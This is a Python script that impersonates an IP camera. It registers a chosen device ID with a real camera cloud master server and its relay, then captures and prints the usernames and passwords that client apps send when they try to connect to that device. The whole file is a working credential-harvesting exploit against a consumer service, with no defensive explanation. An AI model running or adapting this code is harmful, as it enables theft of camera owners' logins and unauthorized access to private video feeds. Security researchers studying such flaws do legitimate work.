#!/usr/bin/python3
import socket
import time
import struct
import sys

DEVICEID = sys.argv[1]
DEVICEMACADDR = '111111111111'
MASTER_SERVER = 'ipc1300.av380.net'
MASTER_PORT = 8877
ADVERTISE_INTERVAL = 2

last_advertise_at = 0

master_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    # print (f'time is: {time.time()} and last time advertised at is: {last_advertise_at}') #debugging
    # Is the current time greater or equal to our advertise interval
    if (time.time() - last_advertise_at) >= ADVERTISE_INTERVAL:
        # Advertise a new camera deviceID and mac addr to the master server
        pre_advertise_data = '03000000000000000000000000000000'
        pre_advertise_data = bytes.fromhex(pre_advertise_data)
        master_sock.sendto(pre_advertise_data, (MASTER_SERVER, MASTER_PORT))
        pre_advertise_data2 = '681132303038333131323334333734313100020c17222d0000'
        pre_advertise_data2 += bytes(DEVICEID, 'utf-8').hex()
        pre_advertise_data2 += '2e6e766476722e6e65740000000000000000000000000000078a1bc0a80109'
        pre_advertise_data2 = bytes.fromhex(pre_advertise_data2)
        master_sock.sendto(pre_advertise_data2, (MASTER_SERVER, 7788))
        print (f'[*] Advertise a new camera to master server with device ID: {DEVICEID}.')
        advertise_data = '02070032303038333131323334333734313100020c17222d0000'
        advertise_data += bytes(DEVICEID, 'utf-8').hex()
        advertise_data += '2e6e766476722e6e65740000000000000000000000000000'
        advertise_data += bytes(DEVICEMACADDR, 'utf-8').hex()
        advertise_data += '8a1bc0a801096762230a93f5d100'
        advertise_data = bytes.fromhex(advertise_data)
        master_sock.sendto(advertise_data, (MASTER_SERVER, MASTER_PORT))
        last_advertise_at = time.time()

    try:
        master_sock.settimeout(1)
        result = (master_sock.recvfrom(4096, 0))[0]
    except socket.timeout:
        continue

    # print (f'Received response from server: {result}') #debugging

    if result[0] == 0xd4:
        # Advertise packet response received from the master server
        pass

    elif result[0] == 0xcd:
        # Bad response
        print (f'\u001b[33m[!] Server does not recognise this device.\u001b[37m')
        exit()

    elif result[0] == 0xcf:
        # Good response and now we need to connect to the relay server
        break


start_ip = 33
end_ip = result.find(b'\x00', start_ip)
relay_ip_addr = result[start_ip:end_ip].decode('utf-8')
start_port = 50
end_port = start_port + 2
relay_port = result[start_port:end_port]
relay_port = struct.unpack('<H', relay_port)
relay_port = relay_port[0]
print (f'\u001b[32m[+] Valid relay server IP address found: {relay_ip_addr}:{relay_port}\u001b[37m')


# Connect to relay server and advertise that we are a camera
print (f'[*] Responding to relay server with device ID: {DEVICEID}.')
advertise_data = '32'
advertise_data += bytes(DEVICEID, 'utf-8').hex()
advertise_data += '2e6e766476722e6e65740000000000000000000000000000302e302e302e30000000000000000000018a1bc4d62f4a41ae000000000000'
advertise_data = bytes.fromhex(advertise_data)
relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
relay_s.sendto(advertise_data, (relay_ip_addr, relay_port))

while True:
    result = relay_s.recvfrom(4096, 0)[0]
    # print (f'[+] Received response from server: {result}') #debugging
    # Check if the result has a username and password
    if result[0] == 0xa7:
        # split out the username and password from the result
        username_start = 8
        password_start = 0x3a
        username = result[username_start:username_start+50].decode('utf-8')
        password = result[password_start:password_start+50].decode('utf-8')
        print (f'\u001b[32m[+] DeviceID: {DEVICEID}')
        print (f'[+] Username: {username}')
        print (f'[+] Password: {password}\u001b[37m')
    else:
        print (f'\u001b[31m[!] Unknown packet received: {result}.\u001b[37m')

#    data = 'a801092f4a42121b8ad4320068cd83a800000004000000000000000000000000000000000000000000000000000000b82200009c00000080f81300c0a80109b6fe00000000000000000000000002000000000000000000000000000000000000000003000000000000000000000000'
#    data = bytes.fromhex(data)
#    relay_s.sendto(data, (relay_ip_addr, relay_port))
